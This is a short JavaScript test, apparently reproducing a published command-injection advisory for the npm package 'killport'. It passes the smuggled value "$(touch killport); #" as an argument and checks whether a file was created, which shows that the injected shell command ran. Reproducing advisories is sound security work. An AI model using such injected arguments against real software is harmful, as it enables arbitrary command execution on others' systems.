//https://snyk.io/vuln/SNYK-JS-KILLPORT-1078535
test("Command Injection in killport", () => 
{
    const  killport = require('killport');
	const fs = require('fs')
	const path = './killport'
	const sleep = require('sleep');
    
    killport("$(touch killport); #");
	
	
	sleep.sleep(5);
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);
});